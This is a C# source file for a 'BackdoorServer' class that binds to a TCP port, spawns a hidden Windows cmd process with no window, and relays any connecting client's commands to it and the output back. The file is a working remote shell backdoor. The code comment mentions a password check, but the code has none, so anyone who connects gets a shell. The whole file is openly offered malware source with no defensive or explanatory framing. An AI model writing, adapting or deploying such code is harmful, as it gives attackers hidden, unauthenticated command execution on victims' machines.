/*****************************************************************
* 
*  Created By DT
*  Modified by Zinzloun 01.2017
* ***************************************************************/

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace BackdoorServer
{
    public class Backdoor
    {
        private TcpListener listener;                       //ServerSocket object for listening
        private Socket mainSocket;                          //Socket to handle client-server communication
        private int port;                           //Port the server listens on
        private String name;                  //The server name
        private bool verbose;                        //Displays messages in console if True
        private Process shell;                              //The shell process
        private StreamReader fromShell;
        private StreamWriter toShell;
        private StreamReader inStream;
        private StreamWriter outStream;
        private Thread shellThread;                         //So we can destroy the Thread when the client disconnects


        //interface to use without initialize
        public static void _bind(string ip, Int32 port)
        {
            Backdoor bd = new Backdoor();
            bd.startServer(ip,port);
        }

        /////////////////////////////////////,///////////////////////////////////
        //the startServer method waits for a connection, checks the password,
        //and either drops the client or starts a remote shell
        ////////////////////////////////////////////////////////////////////////
        public void startServer(string ns,int porta, bool verb=false)
        {
            try
            {
                name = ns;
                port = porta;
                verbose = verb;


                if (verbose)
                    Console.WriteLine("Listening on port " + port);

                //Create the ServerSocket
                listener = new TcpListener(port);
                listener.Start();                                   //Stop and wait for a connection
                mainSocket = listener.AcceptSocket();

                if (verbose)
                    Console.WriteLine("Client connected: " + mainSocket.RemoteEndPoint);

                Stream s = new NetworkStream(mainSocket);
                inStream = new StreamReader(s);
                outStream = new StreamWriter(s);
                outStream.AutoFlush = true;

                
                shell = new Process();
                shell.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                ProcessStartInfo p = new ProcessStartInfo("cmd");
                p.WindowStyle = ProcessWindowStyle.Hidden;
                p.CreateNoWindow = true;
                p.UseShellExecute = false;
                p.RedirectStandardError = true;
                p.RedirectStandardInput = true;
                p.RedirectStandardOutput = true;
                shell.StartInfo = p;
                shell.Start();
                toShell = shell.StandardInput;
                fromShell = shell.StandardOutput;
                toShell.AutoFlush = true;
                shellThread = new Thread(new ThreadStart(getShellInput));   //Start a thread to read output from the shell
                shellThread.Start();
                outStream.WriteLine("Welcome to " + name + " backdoor server.");        //Display a welcome message to the client
                outStream.WriteLine("Starting shell...\n");
                getInput();                                                 //Prepare to monitor client input...
                dropConnection();                                   //When getInput() is terminated the program will come back here

            }
            catch (Exception) { dropConnection(); }
        }
        //////////////////////////////////////////////////////////////////////////////////////////////
        //The run method handles shell output in a seperate thread
        //////////////////////////////////////////////////////////////////////////////////////////////

        void getShellInput()
        {
            try
            {
                String tempBuf = "";
                outStream.WriteLine("\r\n");
                while ((tempBuf = fromShell.ReadLine()) != null)
                {
                    outStream.WriteLine(tempBuf + "\r");
                }
                dropConnection();
            }
            catch (Exception) { /*dropConnection();*/ }
        }

        private void getInput()
        {
            try
            {
                String tempBuff = "";                                       //Prepare a string to hold client commands
                while (((tempBuff = inStream.ReadLine()) != null))
                {         //While the buffer is not null
                    if (verbose)
                        Console.WriteLine("Received command: " + tempBuff);
                    handleCommand(tempBuff);                                //Handle the client's commands
                }
            }
            catch (Exception) { }
        }

        private void handleCommand(String com)
        {        //Here we can catch commands before they are sent
            try
            {                                       //to the shell, so we could write our own if we want
                if (com.Equals("exit"))
                {                //In this case I catch the 'exit' command and use it
                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                    dropConnection();                   //to drop the connection
                }
                toShell.WriteLine(com + "\r\n");
            }
            catch (Exception) { dropConnection(); }
        }

       
        private void dropConnection()
        {
            try
            {
                if (verbose)
                    Console.WriteLine("Dropping Connection");
                shell.Close();
                shell.Dispose();
                shellThread.Abort();
                shellThread = null;
                inStream.Dispose();                                 //Close everything...
                outStream.Dispose();
                toShell.Dispose();
                fromShell.Dispose();
                shell.Dispose();
                mainSocket.Close();
                listener.Stop();
                return;
            }
            catch (Exception) { }
        }
        
    }
}
